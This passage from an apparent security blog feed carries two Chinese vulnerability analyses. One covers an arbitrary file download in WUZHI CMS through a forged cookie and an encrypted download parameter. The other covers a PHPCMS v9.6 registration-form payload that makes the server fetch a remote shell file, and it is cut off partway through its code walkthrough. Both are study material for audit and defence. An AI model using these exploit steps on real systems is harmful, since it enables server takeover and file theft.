    <published>2017-05-08T16:52:09.000Z</published>
    <updated>2018-11-29T09:33:08.967Z</updated>
    
    <content type="html"><![CDATA[<p>最近问<a href="http://balis0ng.com/" target="_blank" rel="noopener">balis0ng师傅</a>要了份源码来看一看，发现几个比较简单的漏洞，这边记录一下。</p><a id="more"></a><h2 id="0x00-漏洞触发点"><a href="#0x00-漏洞触发点" class="headerlink" title="0x00 漏洞触发点"></a>0x00 漏洞触发点</h2><p>在<code>/wuzhi/coreframe/app/content/down.php</code>中<code>down</code>类中的<code>d()</code>方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">d</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($GLOBALS[<span class="string">'s'</span>]) &amp;&amp; !<span class="keyword">empty</span>($GLOBALS[<span class="string">'s'</span>])) &#123;</span><br><span class="line">            $file = decode($GLOBALS[<span class="string">'s'</span>]);</span><br><span class="line">            <span class="keyword">if</span> (strpos($file, <span class="string">'wZ:'</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">                $file = str_replace(<span class="string">'wZ:'</span>,ATTACHMENT_ROOT,$file);</span><br><span class="line">                download($file);</span><br><span class="line">            &#125; <span class="keyword">elseif</span>(preg_match(<span class="string">'/^http:|https:|ftp:/'</span>,$file)) &#123;</span><br><span class="line">                <span class="comment">//远程地址下载</span></span><br><span class="line">                header(<span class="string">"Location:"</span>.$file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到这里并没有对<code>s</code>进行任何处理，直接使用<code>$GLOBALS</code>对<code>s</code>参数进行了获取。只要我们可以控制<code>decode($GLOBALS[&#39;s&#39;])</code>的值，就可以越权实现任意文件下载。</p><h2 id="0x01-具体实现过程"><a href="#0x01-具体实现过程" class="headerlink" title="0x01 具体实现过程"></a>0x01 具体实现过程</h2><h3 id="1-1-查看encode是否可逆"><a href="#1-1-查看encode是否可逆" class="headerlink" title="1.1 查看encode是否可逆"></a>1.1 查看encode是否可逆</h3><p>为了控制<code>decode($GLOBALS[&#39;s&#39;])</code>的值，我们需要看一下是否该<code>encode</code>函数可逆，在<code>/wuzhi/coreframe/core.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($string,$key = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">    $encode = load_class(<span class="string">'encrypt'</span>);</span><br><span class="line">    <span class="keyword">return</span> $encode-&gt;encode($string,$key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进<code>/wuzhi/coreframe/app/core/libs/class/encrypt.class.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($string, $key = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">        $key = $key == <span class="string">''</span> ? _KEY : $key;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;_support_mcrypt) &#123;</span><br><span class="line">            <span class="keyword">return</span> base64_encode(<span class="keyword">$this</span>-&gt;mcrypt_encode($string, $key));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_authcode($string, <span class="string">'ENCODE'</span>, $key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>继续跟进：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_add_cipher_noise</span><span class="params">($data, $key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $key = md5($key);</span><br><span class="line">        $str = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>, $j = <span class="number">0</span>, $ld = strlen($data), $lk = strlen($key); $i &lt; $ld; ++$i, ++$j)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ($j &gt;= $lk)</span><br><span class="line">            &#123;</span><br><span class="line">                $j = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $str .= chr((ord($data[$i]) + ord($key[$j])) % <span class="number">256</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>经过分析，这个加密好像是不可逆的，那么我们就到此为止了么。</p><h3 id="1-2-寻找调用encode且可控的模块及函数"><a href="#1-2-寻找调用encode且可控的模块及函数" class="headerlink" title="1.2 寻找调用encode且可控的模块及函数"></a>1.2 寻找调用encode且可控的模块及函数</h3><p>我们经过全局搜索，找到了在<code>set_cookie()</code>函数（<code>/wuzhi/coreframe/core.php</code>）中，调用了<code>encode()</code>函数，也就是说，接下来要寻找调用<code>set_cookie()</code>函数，且输出结果可控的模块及方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_cookie</span><span class="params">($string, $value = <span class="string">''</span>, $time = <span class="number">0</span>, $encrypt = true)</span> </span>&#123;</span><br><span class="line">    $time = $time &gt; <span class="number">0</span> ? $time : ($value == <span class="string">''</span> ? SYS_TIME - <span class="number">3600</span> : <span class="number">0</span>);</span><br><span class="line">    $s = $_SERVER[<span class="string">'SERVER_PORT'</span>] == <span class="string">'443'</span> ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">    $string = COOKIE_PRE.$string;</span><br><span class="line">    <span class="keyword">if</span>($encrypt) $value = encode($value);</span><br><span class="line">    setcookie($string, $value, $time, COOKIE_PATH, COOKIE_DOMAIN, $s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>全局搜索调用<code>set_cookie()</code>函数的位置，在<code>/wuzhi/coreframe/app/content/index.php</code>发现了可控输入，且根据可控输入生成相应的cookie：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$cookie_city = $_COOKIE[COOKIE_PRE.<span class="string">'city_key'</span>];</span><br><span class="line">        <span class="keyword">if</span>($cookie_city) &#123;</span><br><span class="line">            set_cookie(<span class="string">'city'</span>,$cookie_city);</span><br><span class="line">            $city = $cookie_city;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>且需要设置的cookie名称为一个系统本身的cookie前缀+city_key。前缀在<code>wuzhi/www/configs/web_config.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">'COOKIE_PRE'</span>,<span class="string">'aHU_'</span>); <span class="comment">//Cookie 前缀</span></span><br></pre></td></tr></table></figure><p>综上，我们只需要将构造好的cookie：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cookie名：aHU_city_key</span><br><span class="line">cookie值：wZ:../index.php</span><br></pre></td></tr></table></figure><p>传入，并获取加密后的值（位于），之后再讲加密的值传入d参数中就可进行任意文件下载。</p><h2 id="0x03-利用过程"><a href="#0x03-利用过程" class="headerlink" title="0x03 利用过程"></a>0x03 利用过程</h2><p>首先访问<code>http://127.0.0.1:8888/m=content&amp;f=index&amp;v=init</code>。根据上面的分析我们需要设置<code>cookie</code>为：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD1.png" alt="任意文件下载1"></p><p>刷新页面，可以看到：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD2.png" alt="任意文件下载2"></p><p>在<code>cookie</code>名为<code>aHU_city</code>中获得加密后的内容，即为<code>wZ:../index.php</code>。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD3.png" alt="任意文件下载3"></p><p>之后访问<code>http://127.0.0.1:8888?m=content&amp;f=down&amp;v=d&amp;s=DcR5UIuD2R08LqIz92OW%2Bi0M7gZNCD8o</code></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD4.png" alt="任意文件下载4"></p><p>可以看到index.php文件即被下载，实现了任意文件下载。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近问&lt;a href=&quot;http://balis0ng.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;balis0ng师傅&lt;/a&gt;要了份源码来看一看，发现几个比较简单的漏洞，这边记录一下。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="PHP" scheme="https://lucifaer.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Phpcms V9.6.0任意文件写入getshell</title>
    <link href="https://lucifaer.com/2017/04/13/Phpcms%20V9.6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5getshell/"/>
    <id>https://lucifaer.com/2017/04/13/Phpcms V9.6.0任意文件写入getshell/</id>
    <published>2017-04-13T08:41:00.000Z</published>
    <updated>2018-11-29T09:37:35.313Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-漏洞简述"><a href="#0x00-漏洞简述" class="headerlink" title="0x00 漏洞简述"></a>0x00 漏洞简述</h1><h2 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1. 漏洞简介"></a>1. 漏洞简介</h2><p>上周phpcms v9.6的任意文件上传的漏洞，已经潜伏半年多的一个漏洞。该漏洞可以在用户注册界面以未授权的情况下实现任意文件上传。</p><h2 id="2-漏洞影响版本"><a href="#2-漏洞影响版本" class="headerlink" title="2. 漏洞影响版本"></a>2. 漏洞影响版本</h2><p>phpcms v9.6</p><a id="more"></a><h1 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h1><p>正常部署phpcms v9.6就好。</p><p>复现过程中，可以在用户注册页面通过POST提交：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">siteid=1&amp;modelid=1&amp;username=123456&amp;password=123456&amp;email=123456@qq.com&amp;info[content]=&lt;img src=http://127.0.0.1/shell.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=</span><br></pre></td></tr></table></figure><p>在<code>src</code>后面跟上自己shell的url。注意是要<code>.txt</code>格式写的shell。</p><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>网上已经有逆向分析的过程，这次我来正向的分析一下这个洞。</p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><h3 id="1-文件上传部分"><a href="#1-文件上传部分" class="headerlink" title="1. 文件上传部分"></a>1. 文件上传部分</h3><p>首先看到用户注册的模块，位于<code>phpcms/modules/member/index.php</code>的<code>register</code>方法中。</p><p>代码很多，一点点往下看：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;_session_start();</span><br><span class="line"><span class="comment">//获取用户siteid</span></span><br><span class="line">$siteid = <span class="keyword">isset</span>($_REQUEST[<span class="string">'siteid'</span>]) &amp;&amp; trim($_REQUEST[<span class="string">'siteid'</span>]) ? intval($_REQUEST[<span class="string">'siteid'</span>]) : <span class="number">1</span>;</span><br><span class="line"><span class="comment">//定义站点id常量</span></span><br><span class="line"><span class="keyword">if</span> (!defined(<span class="string">'SITEID'</span>)) &#123;</span><br><span class="line">   define(<span class="string">'SITEID'</span>, $siteid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//加载用户模块配置</span></span><br><span class="line">$member_setting = getcache(<span class="string">'member_setting'</span>);</span><br><span class="line"><span class="keyword">if</span>(!$member_setting[<span class="string">'allowregister'</span>]) &#123;</span><br><span class="line">showmessage(L(<span class="string">'deny_register'</span>), <span class="string">'index.php?m=member&amp;c=index&amp;a=login'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完成了对<code>siteid</code>的定义与注册功能是否开启的检验。注意到了<code>$member_setting = getcache(&#39;member_setting&#39;);</code>跟到<code>phpcms/caches_member/member_setting.cache.php</code>，看一下有关会员注册的设置：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">array</span> (</span><br><span class="line">  <span class="string">'allowregister'</span> =&gt; <span class="string">'1'</span>,</span><br><span class="line">  <span class="string">'choosemodel'</span> =&gt; <span class="string">'1'</span>,</span><br><span class="line">  <span class="string">'enablemailcheck'</span> =&gt; <span class="string">'0'</span>,</span><br><span class="line">  <span class="string">'registerverify'</span> =&gt; <span class="string">'0'</span>,</span><br><span class="line">  <span class="string">'showapppoint'</span> =&gt; <span class="string">'0'</span>,</span><br><span class="line">  <span class="string">'rmb_point_rate'</span> =&gt; <span class="string">'10'</span>,</span><br><span class="line">  <span class="string">'defualtpoint'</span> =&gt; <span class="string">'0'</span>,</span><br><span class="line">  <span class="string">'defualtamount'</span> =&gt; <span class="string">'0'</span>,</span><br><span class="line">  <span class="string">'showregprotocol'</span> =&gt; <span class="string">'0'</span>,</span><br><span class="line">  <span class="string">'regprotocol'</span> =&gt; <span class="string">'省略等等信息'</span></span><br></pre></td></tr></table></figure><p>接下来就是对于post传过来的参数的获取，可以快速跟到130行，看到有我们可控的地方：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($member_setting[<span class="string">'choosemodel'</span>]) &#123;</span><br><span class="line"><span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">'member_input.class.php'</span>;</span><br><span class="line">        <span class="keyword">require_once</span> CACHE_MODEL_PATH.<span class="string">'member_update.class.php'</span>;</span><br><span class="line">$member_input = <span class="keyword">new</span> member_input($userinfo[<span class="string">'modelid'</span>]);</span><br><span class="line">$_POST[<span class="string">'info'</span>] = array_map(<span class="string">'new_html_special_chars'</span>,$_POST[<span class="string">'info'</span>]);</span><br><span class="line">$user_model_info = $member_input-&gt;get($_POST[<span class="string">'info'</span>]);        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，对于<code>modelid</code>是可控的，也就是说<code>member_input</code>的模块调用是可控的。</p><p>其次，就是将我们<code>$_POST[&#39;info&#39;]</code>的参数进行html实体编码，之后调用<code>member_input</code>中的<code>get</code>方法。跟一下，在<code>phpcms/caches/caches_model/caches_data/member_input.class.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;data = $data = trim_script($data);</span><br><span class="line">$model_cache = getcache(<span class="string">'member_model'</span>, <span class="string">'commons'</span>);</span><br><span class="line"><span class="keyword">$this</span>-&gt;db-&gt;table_name = <span class="keyword">$this</span>-&gt;db_pre.$model_cache[<span class="keyword">$this</span>-&gt;modelid][<span class="string">'tablename'</span>];</span><br><span class="line"></span><br><span class="line">$info = <span class="keyword">array</span>();</span><br><span class="line">$debar_filed = <span class="keyword">array</span>(<span class="string">'catid'</span>,<span class="string">'title'</span>,<span class="string">'style'</span>,<span class="string">'thumb'</span>,<span class="string">'status'</span>,<span class="string">'islink'</span>,<span class="string">'description'</span>);</span><br><span class="line"><span class="keyword">if</span>(is_array($data)) &#123;</span><br><span class="line"><span class="keyword">foreach</span>($data <span class="keyword">as</span> $field=&gt;$value) &#123;</span><br><span class="line"><span class="keyword">if</span>($data[<span class="string">'islink'</span>]==<span class="number">1</span> &amp;&amp; !in_array($field,$debar_filed)) <span class="keyword">continue</span>;</span><br><span class="line">$field = safe_replace($field);</span><br><span class="line">$name = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'name'</span>];</span><br><span class="line">$minlength = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'minlength'</span>];</span><br><span class="line">$maxlength = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'maxlength'</span>];</span><br><span class="line">$pattern = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'pattern'</span>];</span><br><span class="line">$errortips = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'errortips'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($errortips)) $errortips = <span class="string">"$name 不符合要求！"</span>;</span><br><span class="line">$length = <span class="keyword">empty</span>($value) ? <span class="number">0</span> : strlen($value);</span><br><span class="line"><span class="keyword">if</span>($minlength &amp;&amp; $length &lt; $minlength &amp;&amp; !$isimport) showmessage(<span class="string">"$name 不得少于 $minlength 个字符！"</span>);</span><br><span class="line"><span class="keyword">if</span> (!array_key_exists($field, <span class="keyword">$this</span>-&gt;fields)) showmessage(<span class="string">'模型中不存在'</span>.$field.<span class="string">'字段'</span>);</span><br><span class="line"><span class="keyword">if</span>($maxlength &amp;&amp; $length &gt; $maxlength &amp;&amp; !$isimport) &#123;</span><br><span class="line">showmessage(<span class="string">"$name 不得超过 $maxlength 个字符！"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">str_cut($value, $maxlength);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($pattern &amp;&amp; $length &amp;&amp; !preg_match($pattern, $value) &amp;&amp; !$isimport) showmessage($errortips);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'isunique'</span>] &amp;&amp; <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>($field=&gt;$value),$field) &amp;&amp; ROUTE_A != <span class="string">'edit'</span>) showmessage(<span class="string">"$name 的值不得重复！"</span>);</span><br><span class="line">$func = <span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'formtype'</span>];</span><br><span class="line"><span class="keyword">if</span>(method_exists(<span class="keyword">$this</span>, $func)) $value = <span class="keyword">$this</span>-&gt;$func($field, $value);</span><br><span class="line"></span><br><span class="line">$info[$field] = $value;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $info;</span><br></pre></td></tr></table></figure><p>看到<code>$func = $this-&gt;fields[$field][&#39;formtype&#39;];</code>，这里的<code>$this-&gt;fields</code>可以在构造函数中找到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;fields = getcache(<span class="string">'model_field_'</span>.$modelid,<span class="string">'model'</span>);</span><br></pre></td></tr></table></figure><p>可控，默认的<code>$modelid</code>是1，跟着看一下<code>phpcms/caches/caches_model/caches_data/member_input.class.php</code>，看一下<code>formtype</code>的值，大致有下面这么多种：</p><ul><li>catid</li><li>typeid</li><li>title</li><li>keyword</li><li>copyfrom</li><li>textarea</li><li>datetime</li><li>editor</li><li>image</li><li>omipotent</li><li>pages</li><li>posid</li><li>groupid</li><li>islink</li><li>text</li><li>number</li><li>template</li><li>box</li><li>readpoint</li></ul><p>同时对比<code>member_input.class.php</code>中的方法，只有：</p><ul><li>textarea</li><li>editor</li><li>box</li><li>images</li><li>datetime</li></ul><p>看一下每一个方法，其中与文件操作有关的，只有editor方法，记一下<code>formtype=editor</code>的field的名字<code>content</code>。</p><p>现在着重来看一下editor方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">editor</span><span class="params">($field, $value)</span> </span>&#123;</span><br><span class="line">$setting = string2array(<span class="keyword">$this</span>-&gt;fields[$field][<span class="string">'setting'</span>]);</span><br><span class="line">$enablesaveimage = $setting[<span class="string">'enablesaveimage'</span>];</span><br><span class="line">$site_setting = string2array(<span class="keyword">$this</span>-&gt;site_config[<span class="string">'setting'</span>]);</span><br><span class="line">$watermark_enable = intval($site_setting[<span class="string">'watermark_enable'</span>]);</span><br><span class="line">$value = <span class="keyword">$this</span>-&gt;attachment-&gt;download(<span class="string">'content'</span>, $value,$watermark_enable);</span><br><span class="line"><span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键在于<code>$value = $this-&gt;attachment-&gt;download(&#39;content&#39;, $value,$watermark_enable);</code></p><p>跟踪<code>$this-&gt;attachment-&gt;download</code>，回看构造函数，也就是跟踪<code>phpcms/libs/classes/attachment.class.php</code>中的<code>download</code>方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">download</span><span class="params">($field, $value,$watermark = <span class="string">'0'</span>,$ext = <span class="string">'gif|jpg|jpeg|bmp|png'</span>, $absurl = <span class="string">''</span>, $basehref = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">global</span> $image_d;</span><br><span class="line"><span class="keyword">$this</span>-&gt;att_db = pc_base::load_model(<span class="string">'attachment_model'</span>);</span><br><span class="line">$upload_url = pc_base::load_config(<span class="string">'system'</span>,<span class="string">'upload_url'</span>);</span><br><span class="line"><span class="keyword">$this</span>-&gt;field = $field;</span><br><span class="line">$dir = date(<span class="string">'Y/md/'</span>);</span><br><span class="line">$uploadpath = $upload_url.$dir;</span><br><span class="line">$uploaddir = <span class="keyword">$this</span>-&gt;upload_root.$dir;</span><br><span class="line">$string = new_stripslashes($value);</span><br><span class="line"><span class="keyword">if</span>(!preg_match_all(<span class="string">"/(href|src)=([\"|']?)([^ \"'&gt;]+\.($ext))\\2/i"</span>, $string, $matches)) <span class="keyword">return</span> $value;</span><br><span class="line">$remotefileurls = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">foreach</span>($matches[<span class="number">3</span>] <span class="keyword">as</span> $matche)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(strpos($matche, <span class="string">'://'</span>) === <span class="keyword">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">dir_create($uploaddir);</span><br><span class="line">$remotefileurls[$matche] = <span class="keyword">$this</span>-&gt;fillurl($matche, $absurl, $basehref);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unset</span>($matches, $string);</span><br><span class="line">$remotefileurls = array_unique($remotefileurls);</span><br><span class="line">$oldpath = $newpath = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">foreach</span>($remotefileurls <span class="keyword">as</span> $k=&gt;$file) &#123;</span><br><span class="line"><span class="keyword">if</span>(strpos($file, <span class="string">'://'</span>) === <span class="keyword">false</span> || strpos($file, $upload_url) !== <span class="keyword">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">$filename = fileext($file);</span><br><span class="line">$file_name = basename($file);</span><br><span class="line">$filename = <span class="keyword">$this</span>-&gt;getname($filename);</span><br><span class="line"></span><br><span class="line">$newfile = $uploaddir.$filename;</span><br><span class="line">$upload_func = <span class="keyword">$this</span>-&gt;upload_func;</span><br><span class="line"><span class="keyword">if</span>($upload_func($file, $newfile)) &#123;</span><br><span class="line">$oldpath[] = $k;</span><br><span class="line">$GLOBALS[<span class="string">'downloadfiles'</span>][] = $newpath[] = $uploadpath.$filename;</span><br><span class="line">@chmod($newfile, <span class="number">0777</span>);</span><br><span class="line">$fileext = fileext($filename);</span><br><span class="line"><span class="keyword">if</span>($watermark)&#123;</span><br><span class="line">watermark($newfile, $newfile,<span class="keyword">$this</span>-&gt;siteid);</span><br><span class="line">&#125;</span><br><span class="line">$filepath = $dir.$filename;</span><br><span class="line">$downloadedfile = <span class="keyword">array</span>(<span class="string">'filename'</span>=&gt;$filename, <span class="string">'filepath'</span>=&gt;$filepath, <span class="string">'filesize'</span>=&gt;filesize($newfile), <span class="string">'fileext'</span>=&gt;$fileext);</span><br><span class="line">$aid = <span class="keyword">$this</span>-&gt;add($downloadedfile);</span><br><span class="line"><span class="keyword">$this</span>-&gt;downloadedfiles[$aid] = $filepath;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> str_replace($oldpath, $newpath, $value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来看到这串正则：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match_all(&quot;/(href|src)=([\&quot;|&apos;]?)([^ \&quot;&apos;&gt;]+\.($ext))\\2/i&quot;, $string, $matches)) return $value;</span><br></pre></td></tr></table></figure><p>作用就是检测后缀名，如果不是<code>gif|jpg|jpeg|bmp|png</code>格式的，就是返回原url，直接退出。这边可以直接绕过：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/phpcms1.png" alt="phpcms1"></p><p>继续向下，看到：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 